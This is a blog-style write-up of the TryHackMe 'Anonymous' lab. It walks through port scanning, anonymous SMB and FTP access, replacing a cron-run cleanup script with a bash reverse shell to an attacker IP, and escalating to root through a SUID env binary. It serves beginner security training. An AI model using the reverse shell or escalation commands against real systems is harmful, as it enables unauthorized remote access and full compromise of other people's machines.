---
layout: post
title: 'Anonymous - TryHackMe Writeup'
date: 2026-02-26 19:24:37 +0000
categories: [cybersecurity]
tags:
  - tryhackme
  - writeup
description: "This room is a classic boot-to-root challenge designed for beginners to practice enumeration, exploiting misconfigured services, and…"
canonical_url: "https://medium.com/@hemanthakrishnach/anonymous-tryhackme-writeup-7727401d444e"
image: "/assets/images/posts/anonymous-tryhackme-writeup/img-000-66592b4f.png"
---

This room is a classic boot-to-root challenge designed for beginners to practice enumeration, exploiting misconfigured services, and…

---

### Anonymous — TryHackMe Writeup

This room is a classic boot-to-root challenge designed for beginners to practice enumeration, exploiting misconfigured services, and performing privilege escalation on a Linux target.![image](/assets/images/posts/anonymous-tryhackme-writeup/img-000-66592b4f.png)

Room Link: <https://tryhackme.com/room/anonymous>

### 🧭 Enumeration

As with any penetration test or CTF-style machine, the first step is enumeration.

### 🔎 Port Scanning

Running an Nmap scan:
```bash
nmap -T4 -p- -A <MACHINE_IP>
```

The scan reveals **4 open ports**.![image](/assets/images/posts/anonymous-tryhackme-writeup/img-001-cad5d7c8.png)

### 🌐 Open Ports & Services

- **Port 21** — FTP- **Port 22** — SSH- **Port 139** — SMB- **Port 445** — SMB

#### Answers:

- **How many ports are open?** → `4`- **What service is running on port 21?** → `FTP`- **What service is running on ports 139 and 445?** → `SMB`

### 📁 SMB Enumeration

Since SMB is exposed, we enumerate shares using:

Using `enum4linux` or similar SMB enumeration tools, we discover a share named `pics` that allows guest/anonymous access.
```bash
nxc smb <MACHINE_IP> -u anonymous -p '' --shares
```
![image](/assets/images/posts/anonymous-tryhackme-writeup/img-002-6bb130b2.png)

Connecting to the share:
```bash
smbclient //<MACHINE_IP>/pics -U anonymous
```
![image](/assets/images/posts/anonymous-tryhackme-writeup/img-003-53ff8e71.png)

Inside the share, we find two image files: `corgo2.jpg` and `puppos.jpeg`. While these appear to be decoys, they confirm our ability to interact with the system's shared storage.

### 📂 FTP Access

Anonymous login is allowed. This provides access to files that may contain credentials or scripts. After downloading and reviewing the available files, useful information can be gathered to move laterally within the system.
```xml
ftp <MACHINE_IP>
```
![image](/assets/images/posts/anonymous-tryhackme-writeup/img-004-59f4276a.png)

- Found a directory named `scripts`.- Inside `scripts`, there are three files: `clean.sh`, `removed_files.log`, and `to_do.txt`.- The `to_do.txt` file contains a note from the admin about needing to disable anonymous login.

![image](/assets/images/posts/anonymous-tryhackme-writeup/img-005-d09a4592.png)

- The `clean.sh` script appears to be a cleanup utility that runs automatically (likely via a cron job), as evidenced by the frequent updates in `removed_files.log`.

![image](/assets/images/posts/anonymous-tryhackme-writeup/img-006-bc626b55.png)

### 🧑‍💻 Gaining Initial Access **via Script Overwrite**

Since we have write permissions on the `scripts` directory, we can overwrite `clean.sh` with a reverse shell payload.

**Reverse Shell Payload:**
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```
![image](/assets/images/posts/anonymous-tryhackme-writeup/img-007-77bbc0e9.png)

After uploading the modified `clean.sh` back to the FTP server, we set up a listener on our local machine: `nc -lvnp 4444`![image](/assets/images/posts/anonymous-tryhackme-writeup/img-008-ef8dc5f2.png)

Within a minute, the cron job executes the script, and we receive a shell as the user `namelessone.`

**User Flag:** Found in `/home/namelessone/user.txt`![image](/assets/images/posts/anonymous-tryhackme-writeup/img-009-4c4d8cc2.png)

### 🔺 Privilege Escalation

To escalate to root, we search for files with the **SUID** bit set.

A common enumeration method:
```typescript
find / -perm -u=s -type f 2>/dev/null
```
![image](/assets/images/posts/anonymous-tryhackme-writeup/img-010-32a16491.png)

The results show that `/usr/bin/env` has the SUID bit set. According to **GTFOBins**, `env` can be used to escalate privileges if the SUID bit is present.![image](/assets/images/posts/anonymous-tryhackme-writeup/img-011-d0313725.png)

#### **Root Exploitation**

We execute the following command to spawn a shell with root privileges:
```bash
env /bin/sh -p
```
![image](/assets/images/posts/anonymous-tryhackme-writeup/img-012-6db9ad6e.png)

Running `whoami` confirms we are now **root**.

**Root Flag:** Found in `/root/root.txt`

### 🎯 Key Learning Points

This room reinforces:

- Proper enumeration techniques- SMB and FTP enumeration- Anonymous access misconfigurations- Basic Linux command-line navigation- Understanding SUID binaries- Using GTFOBins for privilege escalation

Thank you for reading!
